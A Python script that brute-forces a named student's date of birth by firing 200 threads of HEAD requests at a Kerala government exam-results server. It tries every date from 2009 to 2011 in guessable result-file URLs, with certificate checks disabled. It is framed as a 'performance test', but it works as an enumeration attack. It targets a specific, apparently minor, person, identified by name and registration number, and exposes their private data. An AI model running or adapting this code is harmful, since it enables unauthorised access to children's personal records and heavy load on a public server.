import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_date(regno, date_str):
    first_digit = regno[0]
    url = f"https://results.kite.kerala.gov.in/K1TE@SPO@2025@9995994069/K1TE@SPO@20254069_{first_digit}/{date_str}{regno}.json"
    try:
        response = requests.head(url, timeout=1.5, verify=False)
        if response.status_code == 200:
            return date_str, url
    except:
        pass
    return None

def strike_test(regno, workers=200):
    start_time = time.time()
    print(f"[*] Starting 200-thread EXTREME performance test for: {regno}...")
    
    start_date = datetime(2009, 1, 1)
    end_date = datetime(2011, 12, 31)
    
    dates = []
    curr = start_date
    while curr <= end_date:
        dates.append(curr.strftime("%Y%m%d"))
        curr += timedelta(days=1)
    
    found_date = None
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(check_date, regno, d): d for d in dates}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                found_date, found_url = result
                duration = time.time() - start_time
                print(f"[!] HIT SUCCESS: Found {found_date} in {duration:.2f} seconds.")
                executor.shutdown(wait=False, cancel_futures=True)
                return duration
                
    print("[-] No matching DOB found.")
    return None

if __name__ == "__main__":
    # Target: MAHIMA M (793137)
    strike_test("793137", workers=200)
